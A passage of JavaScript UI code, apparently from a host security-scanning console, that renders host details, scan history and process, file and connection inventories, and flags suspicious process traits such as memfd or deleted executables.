    }
    const reloadRule = $("#btnReloadRule");
    if (reloadRule) {
      reloadRule.addEventListener("click", async () => {
        try {
          state.checkDetail = await api(`/v1/checks/${encodeURIComponent(state.selectedCheckId)}`);
          state._ruleSandbox = null;
          toast("Reloaded from disk");
          render();
        } catch (e) {
          toast(e.message);
        }
      });
    }
    async function runRuleSandbox(mode) {
      const id = state.selectedCheckId;
      const ta = $("#ruleTomlEditor");
      if (!id || !ta) return;
      const btnValidate = $("#btnValidateRule");
      const btnTest = $("#btnTestRule");
      if (btnValidate) btnValidate.disabled = true;
      if (btnTest) btnTest.disabled = true;
      try {
        const path = mode === "test"
          ? `/v1/checks/${encodeURIComponent(id)}/test`
          : `/v1/checks/${encodeURIComponent(id)}/validate`;
        const res = await api(path, {
          method: "POST",
          body: {
            toml: ta.value,
            limit: 5000,
            sample_limit: 25,
          },
        });
        state._ruleSandbox = res;
        const hits = res?.dry_run?.hit_count ?? 0;
        toast(mode === "test"
          ? `Test dry-run — ${hits} hit${hits === 1 ? "" : "s"}`
          : `Validated — ${hits} hit${hits === 1 ? "" : "s"}`);
        render();
      } catch (e) {
        state._ruleSandbox = { error: e.message || String(e) };
        toast(e.message);
        render();
      } finally {
        if (btnValidate) btnValidate.disabled = false;
        if (btnTest) btnTest.disabled = false;
      }
    }
    const btnValidate = $("#btnValidateRule");
    if (btnValidate) btnValidate.addEventListener("click", () => runRuleSandbox("validate"));
    const btnTest = $("#btnTestRule");
    if (btnTest) btnTest.addEventListener("click", () => runRuleSandbox("test"));
    const editor = $("#ruleTomlEditor");
    const hl = $("#ruleTomlHighlight");
    if (editor && hl) {
      const syncHl = () => {
        hl.innerHTML = highlightToml(editor.value) + "\n";
        hl.scrollTop = editor.scrollTop;
        hl.scrollLeft = editor.scrollLeft;
      };
      editor.addEventListener("input", syncHl);
      editor.addEventListener("scroll", () => {
        hl.scrollTop = editor.scrollTop;
        hl.scrollLeft = editor.scrollLeft;
      });
    }

    // legacy table rows (if any)
    $$("[data-check]").forEach((tr) => {
      tr.addEventListener("click", () => {
        try {
          const c = JSON.parse(tr.getAttribute("data-check"));
          selectRule(c.id);
        } catch (_) {}
      });
    });

    $$("[data-recheck]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        try {
          await api(`/v1/hosts/${btn.dataset.recheck}/scan`, {
            method: "POST",
            body: { check_set: "standard", priority: 200 },
          });
          toast("Recheck queued");
          await loadLive();
        } catch (err) {
          toast(err.message);
        }
      });
    });
    $$("[data-hunt-from-finding]").forEach((btn) => {
      btn.addEventListener("click", () => {
        closeDrawer();
        setView("hunt");
      });
    });
    bindScanDetailPage();
  }

  async function showHostDetail(id) {
    try {
      const [pack, activityAll] = await Promise.all([
        api(`/v1/hosts/${id}`),
        api("/v1/activity?limit=500").catch(() => state.activity || []),
      ]);
      const hostActivity = (activityAll || []).filter((e) => e.host_id === id);
      const h = pack.host || {};
      const st = hostStatus(h);
      const tags = hostTags(h);
      const findings = pack.findings || [];
      const hostScans = (state.scans || [])
        .filter((s) => {
          const hid = s.job?.host_id || s.meta?.host_id;
          return hid && String(hid) === String(id);
        })
        .sort((a, b) => {
          const ta = String(b.meta?.finished_at || b.job?.created_at || b.job?.id || "");
          const tb = String(a.meta?.finished_at || a.job?.created_at || a.job?.id || "");
          return ta.localeCompare(tb);
        });
      const histKeep = h.labels?.scan_history || h.labels?.scan_history_per_host
        || state.settings?.effective?.scan_history_per_host || 3;
      const hostHash = `#host/${encodeURIComponent(h.id)}`;
      const hostAbs = hostPermalink(h.id);
      const virt = isVirtualHost(h);
      if (!state._hostDetailScanByHost) state._hostDetailScanByHost = {};
      const defaultScanId = String(hostScans[0]?.job?.id || hostScans[0]?.meta?.scan_id || "");
      if (!state._hostDetailScanByHost[id] && defaultScanId) {
        state._hostDetailScanByHost[id] = defaultScanId;
      }
      state._hostDetailScanId = state._hostDetailScanByHost[id] || defaultScanId || "";
      const scanQ = hostInventoryScanQuery({ scanId: state._hostDetailScanId });
      const [procPack, filePack, connPack] = await Promise.all([
        api(`/v1/hosts/${id}/processes?${scanQ}`).catch(() => null),
        api(`/v1/hosts/${id}/files?${scanQ}`).catch(() => null),
        api(`/v1/hosts/${id}/connections?${scanQ}`).catch(() => null),
      ]);
      const invCounts = {
        processes: Number(procPack?.count ?? 0),
        files: Number(filePack?.count ?? 0),
        connections: Number(connPack?.count ?? 0),
      };
      if (location.hash !== hostHash) history.replaceState(null, "", hostHash);
      openDrawer(h.display_name || "Host", `
        <div class="host-detail-head">
          <div>
            <div class="host-detail-title">${esc(h.display_name || "Host")}</div>
            <div class="mono muted">${esc(h.primary_addr || "—")}:${h.ssh_port || 22} · <span class="host-status ${st.key}">${esc(st.label)}</span></div>
          </div>
          <button type="button" class="btn ghost tiny" data-copy-host-link="${esc(hostAbs)}">Copy link</button>
        </div>
        <div class="host-detail-tabs">
          <button type="button" class="tab active" data-host-tab="summary">Summary</button>
          <button type="button" class="tab" data-host-tab="processes">Processes (${esc(String(invCounts.processes))})</button>
          <button type="button" class="tab" data-host-tab="files">Files (${esc(String(invCounts.files))})</button>
          <button type="button" class="tab" data-host-tab="connections">Connections (${esc(String(invCounts.connections))})</button>
          <button type="button" class="tab" data-host-tab="scans">Scans (${hostScans.length}/${esc(String(histKeep))})</button>
          <button type="button" class="tab" data-host-tab="scanlog">Scan log (${hostActivity.length})</button>
          <button type="button" class="tab" data-host-tab="findings">Findings (${findings.length})</button>
          <button type="button" class="tab" data-host-tab="ops">Operations</button>
          <button type="button" class="tab" data-host-tab="raw">Raw JSON</button>
        </div>
        ${hostScanPickerHtml(hostScans, state._hostDetailScanId)}
        <div data-host-pane="summary">
          <dl class="kv">
            <dt>Status</dt><dd><span class="host-status ${st.key}">${esc(st.label)}</span>
              <div class="muted" style="font-size:0.75rem">Health checked ${esc(fmtWhen(h.auth_checked_at) || "never")}</div>
            </dd>
            <dt>Target</dt><dd class="mono">${esc(h.primary_addr || "—")}:${h.ssh_port || 22}</dd>
            <dt>Auth / outcome</dt><dd>${esc(st.auth || "—")}</dd>
            <dt>Last scan</dt><dd class="mono">${esc(fmtWhen(h.last_scan_at))}</dd>
            <dt>Selected scan</dt><dd class="mono" id="hostDetailScanHint">${esc(
              (() => {
                const sid = state._hostDetailScanId
                  || String(hostScans[0]?.job?.id || hostScans[0]?.meta?.scan_id || "");
                if (!sid) return "latest available";
                const s = hostScans.find((x) => String(x.job?.id || x.meta?.scan_id || "") === sid);
                const when = s?.meta?.finished_at || s?.job?.created_at || "";
                return `${shortId(sid)}${when ? ` · ${fmtWhen(when)}` : ""}`;
              })()
            )}</dd>
            <dt>Inventory</dt><dd id="hostDetailInvCounts">
              <span class="mono">${esc(String(invCounts.processes))} processes</span>
              · <span class="mono">${esc(String(invCounts.files))} files</span>
              · <span class="mono">${esc(String(invCounts.connections))} connections</span>
              <div class="muted" style="font-size:0.75rem">Counts for the selected scan (change above to compare history)</div>
            </dd>
            <dt>Open findings</dt><dd>${esc(pack.open_findings ?? findings.length)}</dd>
            <dt>Host key</dt><dd class="mono">${pack.host_key ? esc(`${pack.host_key.key_type} ${pack.host_key.fingerprint}`) : "(unpinned)"}</dd>
            <dt>Tags</dt><dd>${tags.length ? tags.map((t) => `<span class="tag">${esc(t)}</span>`).join(" ") : "—"}</dd>
            <dt>OS</dt><dd>${esc(h.os || "—")}${h.os_id || h.os_version ? ` <span class="mono muted">(${esc([h.os_id, h.os_version].filter(Boolean).join(" "))})</span>` : ""}</dd>
            <dt>Arch / kernel</dt><dd>${esc(h.arch || "—")} / ${esc(h.kernel || "—")}</dd>
            <dt>Agent</dt><dd><span class="tag">${esc(hostAgentInfo(h).title)}</span>
              <div class="muted" style="font-size:0.8rem;margin-top:0.2rem">${esc(hostAgentInfo(h).detail)}</div>
              ${isAgentLiteHost(h) && (h.labels?.collect_paths || "").trim()
                ? `<div class="mono muted" style="font-size:0.78rem;margin-top:0.25rem;white-space:pre-wrap">collect_paths:\n${esc(String(h.labels.collect_paths).trim())}</div>`
                : (isAgentLiteHost(h) ? `<div class="muted" style="font-size:0.75rem;margin-top:0.2rem">File inventory: defaults (/bin, /etc, /tmp, …). Edit host to add paths.</div>` : "")}
              ${h.ingest_token ? `<div class="mono muted" style="font-size:0.78rem">ingest ${esc(shortId(h.ingest_token))}</div>` : ""}
              ${virt && h.labels?.virtual_agent ? `<div class="mono muted" style="font-size:0.78rem">profile ${esc(h.labels.virtual_agent)}</div>` : ""}
            </dd>
            <dt>Link</dt><dd class="mono finding-permalink"><a href="${esc(hostHash)}">${esc(hostAbs)}</a></dd>
          </dl>
          <div class="form-actions" style="justify-content:flex-start;margin-top:1rem">
            ${virt
              ? `<button class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>
                 <button class="btn ghost" data-copy-ingest="${esc(h.ingest_token || "")}">Copy ingest token</button>
                 <button class="btn ghost" data-goto="settings">Settings</button>`
              : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
            <button class="btn ghost" data-edit-host="${esc(h.id)}">Edit</button>
            <button class="btn ghost" data-copy-host-link="${esc(hostAbs)}">Copy link</button>
            <button class="btn ghost danger-text" data-delete-host="${esc(h.id)}">Delete</button>
          </div>
        </div>
        <div data-host-pane="processes" class="hidden">
          <div class="muted" style="margin-bottom:0.65rem">${virt
            ? `Process inventory from the selected scan (or ingest JSONL when no scan rows).`
            : `Process inventory from the <strong>selected scan</strong> above (falls back to latest if empty).`}</div>
          <div class="form-actions" style="justify-content:flex-start;margin-bottom:0.75rem">
            <button type="button" class="btn ghost" id="btnLoadProcesses">Reload processes</button>
            ${virt
              ? `<button type="button" class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>`
              : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
          </div>
          <div id="hostProcessesPane"><div class="empty">Loading…</div></div>
        </div>
        <div data-host-pane="files" class="hidden">
          <div class="muted" style="margin-bottom:0.65rem">${virt
            ? `File inventory from the selected scan (or ingest JSONL when no scan rows).`
            : `File inventory from the <strong>selected scan</strong> above.`}</div>
          <div class="form-actions" style="justify-content:flex-start;margin-bottom:0.75rem">
            <button type="button" class="btn ghost" id="btnLoadFiles">Reload files</button>
            ${virt
              ? `<button type="button" class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>`
              : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
          </div>
          <div id="hostFilesPane"><div class="empty">Loading…</div></div>
        </div>
        <div data-host-pane="connections" class="hidden">
          <div class="muted" style="margin-bottom:0.65rem">${virt
            ? `Open sockets from the selected import snapshot when present.`
            : `Open sockets from the <strong>selected scan</strong> above.`}</div>
          <div class="form-actions" style="justify-content:flex-start;margin-bottom:0.75rem">
            <button type="button" class="btn ghost" id="btnLoadConnections">Reload connections</button>
            ${virt
              ? `<button type="button" class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>`
              : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
          </div>
          <div id="hostConnectionsPane"><div class="empty">Loading…</div></div>
        </div>
        <div data-host-pane="scans" class="hidden">
          <p class="muted" style="margin:0 0 0.75rem;font-size:0.85rem">
            ${virt
              ? `Import snapshots for this virtual agent (keep=${esc(String(histKeep))}). Each Update/import with “Record a scan snapshot” adds a row here.`
              : `Retained finished scans for this host (keep=${esc(String(histKeep))}). Active jobs are always listed.`}
          </p>
          ${!hostScans.length ? `<div class="empty">${virt
            ? `No import scans yet — use <strong>Update</strong> and keep “Record a scan snapshot” checked.`
            : `No scan history for this host yet.`}</div>` : `
          <table class="data scan-history-table"><thead><tr>
            <th>When</th><th>Scan</th><th>Set</th><th>State</th><th>Coverage</th><th>Findings</th><th></th>
          </tr></thead><tbody>
            ${hostScans.map((s) => {
              const j = s.job || {};
              const m = s.meta || {};
              const sid = j.id || m.scan_id || "";
              const fired = m.fired ?? (s.findings || []).length;
              const applicable = m.applicable_checks ?? "—";
              const when = scanWhen(s);
              const href = sid ? `#/scans/${encodeURIComponent(sid)}` : "#";
              const dur = m.duration_ms != null ? `${Number(m.duration_ms).toLocaleString()} ms` : "";
              const setLabel = j.check_set || (m.probe_version === "virtual-import" ? "virtual-import" : "—");
              const stateLabel = j.state || (m.outcome ? String(m.outcome).toLowerCase() : "—");
              return `<tr class="scan-history-row" data-open-scan="${esc(sid)}">
                <td>
                  <div class="mono">${esc(fmtWhen(when))}</div>
                  ${dur ? `<div class="muted" style="font-size:0.72rem">${esc(dur)}</div>` : ""}
                </td>
                <td class="mono"><a href="${esc(href)}" data-open-scan="${esc(sid)}">${esc(shortId(sid))}</a></td>
                <td>${esc(setLabel)}</td>
                <td><span class="pill neutral">${esc(stateLabel)}</span></td>
                <td class="mono">${esc(String(fired))}/${esc(String(applicable))}</td>
                <td>${(s.findings || []).length}</td>
                <td class="row-actions">
                  <button type="button" class="btn ghost tiny" data-use-inventory-scan="${esc(sid)}" title="Show Processes / Files / Connections from this scan">Use for inventory</button>
                  <button type="button" class="btn primary tiny" data-open-scan="${esc(sid)}">View scan</button>
                </td>
              </tr>`;
            }).join("")}
          </tbody></table>`}
          <div class="form-actions" style="justify-content:flex-start;margin-top:1rem">
            ${virt
              ? `<button type="button" class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>`
              : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
            <button class="btn ghost" data-goto="scans">All scans</button>
          </div>
        </div>
        <div data-host-pane="scanlog" class="hidden">
          ${!hostActivity.length ? `<div class="empty">${virt
            ? "No activity yet. Feed logs or import a host tree snapshot to see events here."
            : "No scan activity for this host yet. Queue a scan to see stage-by-stage progress here."}</div>` : `
          <div class="live-log host-scan-log">${hostActivity.map((e) => {
            const lvl = (e.level || "info").toLowerCase();
            return `<div class="live-line ${esc(lvl)}">
              <span class="ts mono">${esc(fmtTime(e.ts))}</span>
              <span class="lvl">${esc(lvl)}</span>
              <span class="msg">${esc(e.message)}</span>
              <div class="mono muted" style="font-size:0.72rem">${esc(e.kind || "")}${e.scan_id ? " · " + esc(shortId(e.scan_id)) : ""}</div>
            </div>`;
          }).join("")}</div>`}
          <div class="form-actions" style="justify-content:flex-start;margin-top:1rem">
            ${virt
              ? `<button type="button" class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>`
              : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
            <button class="btn ghost" data-goto="activity">Open Activity</button>
          </div>
        </div>
        <div data-host-pane="findings" class="hidden">
          ${!findings.length ? `<div class="empty">No findings for this host</div>` : `
          <table class="data"><thead><tr><th>Severity</th><th>Title</th><th>Check</th><th></th></tr></thead><tbody>
            ${findings.map((f) => {
              const href = `#finding/${encodeURIComponent(f.id)}`;
              const abs = findingPermalink(f.id);
              return `<tr data-fid="${esc(f.id)}">
              <td>${sev(f.severity)}</td>
              <td><a class="finding-link" href="${esc(href)}" data-fid-link="${esc(f.id)}">${esc(f.title)}</a></td>
              <td class="mono">${esc(f.check_id)}</td>
              <td class="row-actions">
                <button type="button" class="btn ghost tiny" data-copy-finding="${esc(abs)}" title="Copy direct link">Link</button>
              </td>
            </tr>`;
            }).join("")}
          </tbody></table>`}
        </div>
        <div data-host-pane="ops" class="hidden">
          <dl class="kv">
            <dt>Host ID</dt><dd class="mono">${esc(h.id)}</dd>
            <dt>Tenant</dt><dd class="mono">${esc(h.tenant_id || "—")}</dd>
            <dt>Credential</dt><dd>${esc(h.labels?.credential || "(default / unset)")}</dd>
            <dt>SSH auth</dt><dd>${esc(h.labels?.ssh_auth || (h.labels?.ssh_password_file ? "password" : "publickey"))} · ${esc(h.labels?.ssh_user || "—")}
              <div class="muted mono" style="font-size:0.78rem">${esc(h.labels?.ssh_identity || h.labels?.ssh_password_file || "—")}</div>
            </dd>
            <dt>Sudo</dt><dd>${["1","true","yes","on"].includes(String(h.labels?.ssh_sudo || "").toLowerCase())
              ? `enabled · ${esc(h.labels?.ssh_sudo_mode || "ssh_password")}`
              : "off"}</dd>
            <dt>Scan method</dt><dd>${esc(hostAgentInfo(h).detail)}</dd>
            <dt>Auth status</dt><dd><span class="host-status ${st.key}">${esc(st.label)}</span> ${esc(h.auth_status || "never")}
              <div class="muted" style="font-size:0.8rem">${esc(h.auth_detail || "")}</div>
              <div class="muted" style="font-size:0.75rem">Checked ${esc(fmtWhen(h.auth_checked_at) || "never")}</div>
            </dd>
            <dt>Connect timeout</dt><dd>${esc(h.timeouts?.connect_timeout_secs ?? "fleet default")}s</dd>
            <dt>Auth timeout</dt><dd>${esc(h.timeouts?.auth_timeout_secs ?? "fleet default")}s</dd>
            <dt>Scan timeout</dt><dd>${esc(h.timeouts?.scan_timeout_secs ?? "fleet default")}s</dd>
            <dt>Preferred check set</dt><dd>${esc(h.labels?.check_set || h.labels?.default_check_set || "fleet default")}</dd>
            <dt>Scan interval</dt><dd>${esc(hostScanIntervalLabel(h))}</dd>
            <dt>Scan history keep</dt><dd>${esc(h.labels?.scan_history || h.labels?.scan_history_per_host || "fleet default")}</dd>
            <dt>Connect delay</dt><dd>${esc(h.timeouts?.connect_delay_ms ?? 0)}ms</dd>
          </dl>
        </div>
        <div data-host-pane="raw" class="hidden">
          <div class="form-actions" style="justify-content:flex-start;margin-bottom:0.75rem">
            <button class="btn ghost" id="btnCopyHostJson">Copy JSON</button>
          </div>
          <pre class="json" id="hostRawJson">${esc(JSON.stringify(pack, null, 2))}</pre>
        </div>
      `, { mode: "wide" });
      $$("[data-feed-virtual]", $("#drawerBody")).forEach((btn) => {
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          showFeedVirtualHost(
            btn.getAttribute("data-feed-virtual"),
            btn.getAttribute("data-feed-name") || ""
          );
        });
      });
      const btnProc = $("#btnLoadProcesses");
      if (btnProc) btnProc.addEventListener("click", () => loadHostProcesses(h.id, { virtual: virt }));
      const btnFiles = $("#btnLoadFiles");
      if (btnFiles) btnFiles.addEventListener("click", () => loadHostFiles(h.id, { virtual: virt }));
      const btnConn = $("#btnLoadConnections");
      if (btnConn) btnConn.addEventListener("click", () => loadHostConnections(h.id, { virtual: virt }));

      const scanSel = $("#hostDetailScanSelect");
      if (scanSel) {
        scanSel.addEventListener("change", async () => {
          const sid = scanSel.value || "";
          state._hostDetailScanId = sid;
          if (!state._hostDetailScanByHost) state._hostDetailScanByHost = {};
          state._hostDetailScanByHost[h.id] = sid;
          const hint = $("#hostDetailScanHint");
          if (hint) {
            const s = hostScans.find((x) => String(x.job?.id || x.meta?.scan_id || "") === sid);
            const when = s?.meta?.finished_at || s?.job?.created_at || "";
            hint.textContent = sid ? `${shortId(sid)}${when ? ` · ${fmtWhen(when)}` : ""}` : "latest available";
          }
          // Refresh counts + any open inventory pane.
          try {
            const q = hostInventoryScanQuery({ scanId: sid });
            const [p, f, c] = await Promise.all([
              api(`/v1/hosts/${h.id}/processes?${q}`).catch(() => null),
              api(`/v1/hosts/${h.id}/files?${q}`).catch(() => null),
              api(`/v1/hosts/${h.id}/connections?${q}`).catch(() => null),
            ]);
            const tabBtns = $$("[data-host-tab]");
            const pc = Number(p?.count ?? 0);
            const fc = Number(f?.count ?? 0);
            const cc = Number(c?.count ?? 0);
            tabBtns.forEach((b) => {
              const tab = b.getAttribute("data-host-tab");
              if (tab === "processes") b.textContent = `Processes (${pc})`;
              if (tab === "files") b.textContent = `Files (${fc})`;
              if (tab === "connections") b.textContent = `Connections (${cc})`;
            });
            const invDd = $("#hostDetailInvCounts");
            if (invDd) {
              invDd.innerHTML = `<span class="mono">${pc} processes</span>
              · <span class="mono">${fc} files</span>
              · <span class="mono">${cc} connections</span>
              <div class="muted" style="font-size:0.75rem">Counts for the selected scan (change above to compare history)</div>`;
            }
          } catch (_) {}
          const active = $$("[data-host-tab].active")[0]?.getAttribute("data-host-tab");
          if (active === "processes") loadHostProcesses(h.id, { virtual: virt });
          else if (active === "files") loadHostFiles(h.id, { virtual: virt });
          else if (active === "connections") loadHostConnections(h.id, { virtual: virt });
          toast(`Inventory scan → ${shortId(sid) || "latest"}`);
        });
      }
      const btnViewScan = $("#btnViewSelectedScan");
      if (btnViewScan) {
        btnViewScan.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          const sid = ($("#hostDetailScanSelect")?.value || state._hostDetailScanId || "").trim();
          if (!sid) {
            toast("No scan selected");
            return;
          }
          openScanById(sid).catch((err) => toast(err.message));
        });
      }

      $$("[data-host-tab]").forEach((btn) => {
        btn.addEventListener("click", () => {
          $$("[data-host-tab]").forEach((b) => b.classList.toggle("active", b === btn));
          $$("[data-host-pane]").forEach((p) => {
            p.classList.toggle("hidden", p.getAttribute("data-host-pane") !== btn.dataset.hostTab);
          });
          if (btn.dataset.hostTab === "processes") loadHostProcesses(h.id, { virtual: virt });
          if (btn.dataset.hostTab === "files") loadHostFiles(h.id, { virtual: virt });
          if (btn.dataset.hostTab === "connections") loadHostConnections(h.id, { virtual: virt });
        });
      });
      $$("[data-goto]", $("#drawerBody")).forEach((b) => {
        b.addEventListener("click", () => { closeDrawer(); setView(b.dataset.goto); });
      });
      $$("[data-copy-ingest]", $("#drawerBody")).forEach((btn) => {
        btn.addEventListener("click", async (e) => {
          e.preventDefault();
          e.stopPropagation();
          const tok = btn.getAttribute("data-copy-ingest") || "";
          try {
            await navigator.clipboard.writeText(tok);
            toast(tok ? "Ingest token copied" : "No ingest token");
          } catch (_) {
            toast(tok || "No token");
          }
        });
      });
      const copyBtn = $("#btnCopyHostJson");
      if (copyBtn) {
        copyBtn.addEventListener("click", async () => {
          try {
            await navigator.clipboard.writeText(JSON.stringify(pack, null, 2));
            toast("Host JSON copied");
          } catch (_) {
            toast("Clipboard unavailable");
          }
        });
      }
      $$("[data-fid]").forEach((tr) => {
        tr.addEventListener("click", (e) => {
          if (e.target.closest("a, button, [data-stop]")) return;
          openFindingById(tr.getAttribute("data-fid"));
        });
      });
      $$("[data-fid-link]").forEach((a) => {
        a.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          openFindingById(a.getAttribute("data-fid-link"));
        });
      });
      $$("[data-copy-finding]").forEach((btn) => {
        btn.addEventListener("click", async (e) => {
          e.preventDefault();
          e.stopPropagation();
          const url = btn.getAttribute("data-copy-finding") || "";
          try {
            await navigator.clipboard.writeText(url);
            toast("Finding link copied");
          } catch (_) {
            toast(url);
          }
        });
      });
      $$("[data-open-scan]", $("#drawerBody")).forEach((el) => {
        el.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          const sid = el.getAttribute("data-open-scan");
          if (sid) openScanById(sid).catch((err) => toast(err.message));
        });
      });
      $$("[data-use-inventory-scan]", $("#drawerBody")).forEach((btn) => {
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          const sid = btn.getAttribute("data-use-inventory-scan") || "";
          const sel = $("#hostDetailScanSelect");
          if (!sel || !sid) return;
          sel.value = sid;
          sel.dispatchEvent(new Event("change"));
          // Jump to processes so the selected scan’s inventory is visible.
          const procTab = $$("[data-host-tab]").find((b) => b.getAttribute("data-host-tab") === "processes");
          if (procTab) procTab.click();
        });
      });
      $$("[data-copy-host-link]", $("#drawerBody")).forEach((btn) => {
        btn.addEventListener("click", async (e) => {
          e.preventDefault();
          e.stopPropagation();
          const url = btn.getAttribute("data-copy-host-link") || "";
          try {
            await navigator.clipboard.writeText(url);
            toast("Host link copied");
          } catch (_) {
            toast(url);
          }
        });
      });
      wireHostActionButtons($("#drawerBody"));
    } catch (err) {
      toast(err.message);
    }
  }

  function hostInventoryScanQuery(opts) {
    const parts = ["limit=50000"];
    const scanId = (opts && opts.scanId) || state._hostDetailScanId || "";
    if (scanId) parts.push(`scan_id=${encodeURIComponent(scanId)}`);
    return parts.join("&");
  }

  function hostScanPickerHtml(hostScans, selectedScanId) {
    const opts = (hostScans || []).map((s, i) => {
      const j = s.job || {};
      const m = s.meta || {};
      const sid = String(j.id || m.scan_id || "");
      if (!sid) return "";
      const when = m.finished_at || j.created_at || "";
      const setLabel = j.check_set || (m.probe_version === "virtual-import" ? "virtual-import" : "scan");
      const label = `#${i + 1} · ${fmtWhen(when)} · ${setLabel} · ${shortId(sid)}`;
      const sel = String(selectedScanId || "") === sid || (!selectedScanId && i === 0) ? "selected" : "";
      return `<option value="${esc(sid)}" ${sel}>${esc(label)}</option>`;
    }).filter(Boolean);
    if (!opts.length) {
      return `<div class="host-scan-picker muted" style="font-size:0.82rem;margin-bottom:0.65rem">No retained scans yet — inventory uses latest available data.</div>`;
    }
    return `<div class="host-scan-picker">
      <label>Inventory scan
        <select id="hostDetailScanSelect" class="ml-select" title="Which finished scan feeds Processes / Files / Connections">
          ${opts.join("")}
        </select>
      </label>
      <button type="button" class="btn primary tiny" id="btnViewSelectedScan" title="Open the selected scan as a full page">View scan</button>
      <span class="muted" style="font-size:0.75rem">Applies to Processes, Files, and Connections · View scan opens the full page</span>
    </div>`;
  }

  function pathBytes(p) {
    if (p == null || p === "") return "";
    if (typeof p === "string") return p;
    if (typeof p !== "object") return String(p);
    // PathBytes JSON: {"s":"…"} UTF-8 or {"b":"<base64>"} / legacy utf8/b64 keys.
    if (typeof p.s === "string") return p.s;
    if (typeof p.utf8 === "string") return p.utf8;
    if (typeof p.b === "string") return p.b;
    if (typeof p.b64 === "string") return p.b64;
    return "";
  }

  async function loadHostProcesses(hostId, opts) {
    const pane = $("#hostProcessesPane");
    if (!pane) return;
    const virt = !!(opts && opts.virtual);
    pane.innerHTML = `<div class="empty">Loading processes…</div>`;
    try {
      const pack = await api(`/v1/hosts/${hostId}/processes?${hostInventoryScanQuery(opts)}`);
      const rows = pack.processes || [];
      if (!rows.length) {
        pane.innerHTML = virt
          ? `<div class="empty">No process rows for this scan. Try another inventory scan, or <strong>Update</strong> with process JSONL.</div>`
          : `<div class="empty">No process inventory for this scan. Pick another scan above, or run a scan that includes <span class="mono">process.inventory</span>.</div>`;
        return;
      }
      const src = pack.source === "virtual_ingest"
        ? "ingest JSONL"
        : (pack.scan_id ? `scan ${shortId(pack.scan_id)}` : "store");
      const renderRows = (filterQ = "") => {
        const q = String(filterQ || "").toLowerCase().trim();
        const shown = !q ? rows : rows.filter((p) => {
          const hay = [
            p.comm, p.username, pathBytes(p.exe),
            ...(p.cmdline || []).map(pathBytes),
            String(p.pid), String(p.ppid),
          ].join(" ").toLowerCase();
          return hay.includes(q);
        });
        return `
        <div class="toolbar" style="margin-bottom:0.55rem;gap:0.45rem">
          <input id="hostProcQ" type="search" placeholder="Filter by name, path, pid…" value="${esc(filterQ)}" style="min-width:14rem" />
          <span class="muted" style="font-size:0.78rem">${shown.length.toLocaleString()} / ${rows.length.toLocaleString()} · ${esc(src)}</span>
        </div>
        <table class="data"><thead><tr>
          <th>PID</th><th>PPID</th><th>User</th><th>State</th><th>Comm</th><th>Cmdline</th><th>Exe</th><th>Listen</th><th>NS net</th><th>Flags</th>
        </tr></thead><tbody>
          ${shown.map((p) => {
            const flags = [];
            if (p.exe_memfd) flags.push("memfd");
            if (p.exe_deleted) flags.push("deleted");
            if (p.rwx_maps) flags.push(`rwx:${p.rwx_maps}`);
            if (p.unbacked_exec) flags.push(`unbacked:${p.unbacked_exec}`);
            if (p.selinux) flags.push(p.selinux);
            if ((p.environ_flags || []).length) flags.push(...p.environ_flags);
            const listen = (p.listen_ports || []).join(", ") || "—";
            const user = p.username || ((p.uids && p.uids[0] != null) ? String(p.uids[0]) : "—");
            const cmd = (p.cmdline || []).map(pathBytes).filter(Boolean).join(" ") || "—";
            const nsNet = (p.ns && (p.ns.net?.utf8 || p.ns.net?.b64 || p.ns.net?.s || p.ns.net?.b || p.ns.net)) || "—";
            const nsNetStr = typeof nsNet === "string" ? nsNet : (pathBytes(nsNet) || "—");
            const exeStr = pathBytes(p.exe) || "—";
            return `<tr>
              <td class="mono">${esc(p.pid)}</td>
              <td class="mono">${esc(p.ppid)}</td>
              <td class="mono">${esc(user)}</td>
              <td class="mono">${esc(p.state || "—")}</td>
              <td class="mono">${esc(p.comm || "—")}</td>
              <td class="mono" title="${esc(cmd)}">${esc(cmd.length > 64 ? cmd.slice(0, 64) + "…" : cmd)}</td>
              <td class="mono" title="${esc(exeStr)}">${esc(exeStr)}</td>
              <td class="mono">${esc(listen)}</td>
              <td class="mono" title="${esc(nsNetStr)}">${esc(nsNetStr === "—" ? "—" : String(nsNetStr).slice(0, 12))}</td>
              <td>${flags.length ? flags.map((f) => `<span class="tag">${esc(f)}</span>`).join(" ") : "—"}</td>
            </tr>`;
          }).join("")}
        </tbody></table>`;
      };
      pane.innerHTML = renderRows("");
      const qEl = $("#hostProcQ");
      let t = 0;
      qEl?.addEventListener("input", () => {
        clearTimeout(t);
        t = setTimeout(() => {
          const v = qEl.value || "";
          pane.innerHTML = renderRows(v);
          const again = $("#hostProcQ");
          if (again) {
            again.focus();
            try { again.setSelectionRange(v.length, v.length); } catch (_) {}
            again.addEventListener("input", () => {
              clearTimeout(t);
              t = setTimeout(() => {
                pane.innerHTML = renderRows(again.value || "");
                const el = $("#hostProcQ");
                if (el) {
                  el.focus();
                  try { el.setSelectionRange(el.value.length, el.value.length); } catch (_) {}
                }
              }, 100);
            });
          }
        }, 100);
      });
    } catch (err) {
      pane.innerHTML = `<div class="empty">${esc(err.message || "Failed to load processes")}</div>`;
    }
  }

  async function loadHostFiles(hostId, opts) {
    const pane = $("#hostFilesPane");
    if (!pane) return;
    const virt = !!(opts && opts.virtual);
